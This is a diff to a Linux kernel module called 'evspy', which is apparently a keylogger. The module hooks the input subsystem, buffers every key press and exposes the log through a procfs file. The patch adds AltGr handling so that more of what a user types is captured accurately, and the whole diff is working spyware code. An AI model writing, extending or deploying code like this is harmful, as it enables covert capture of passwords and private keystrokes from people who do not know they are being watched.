@@ -28,6 +28,7 @@ static char *rdp;			// read pointer
 static char *wrp;			// write pointer
 static unsigned short int capslock_state = EVS_VAL_FREE;
 static unsigned short int shift = 0;
+static unsigned short int altgr = 0;
 
 /*
  * Executed when the procfs file is read (EVS_PROCNAME)
@@ -115,8 +116,13 @@ static void special_char(unsigned int code, unsigned int value)
 		sp_tag = "[+ALT]";
 		break;
 	case KEY_RIGHTALT:
+#ifdef EVS_ALTGR_ENABLED
+		altgr = !altgr;
+		return;
+#else
 		sp_tag = "[+ALTGR]";
 		break;
+#endif
 	case KEY_LEFTCTRL:
 	case KEY_RIGHTCTRL:
 		sp_tag = "[+CTRL]";
@@ -189,7 +195,9 @@ static void evspy_event(struct input_handle *handle, unsigned int type,
 
 	// "Direct" keys (alphanumeric + some symbols)
 	} else if (value == EVS_VAL_PRESS) {
-		if (shift)
+		if (altgr)
+			evs_insert(evs_altgr(code));
+		else if (shift)
 			evs_insert(evs_shift(code));
 		else
 			evs_insert(map[code]);
@@ -253,6 +261,9 @@ static int __init evspy_init(void)
 {
 	create_proc_read_entry(EVS_PROCNAME, 0, NULL, evspy_read_proc, NULL);
 	init_shiftmap();
+#ifdef EVS_ALTGR_ENABLED
+	init_altgrmap();
+#endif
 	buffer = kmalloc(EVS_BUFSIZE, GFP_KERNEL);
 	rdp = wrp = buffer;
 	return !buffer || input_register_handler(&evspy_handler);
@@ -262,6 +273,9 @@ static void __exit evspy_exit(void)
 {
 	input_unregister_handler(&evspy_handler);
 	kfree(buffer);
+#ifdef EVS_ALTGR_ENABLED
+	exit_altgrmap();
+#endif
 	exit_shiftmap();
 	remove_proc_entry(EVS_PROCNAME, NULL);
 }
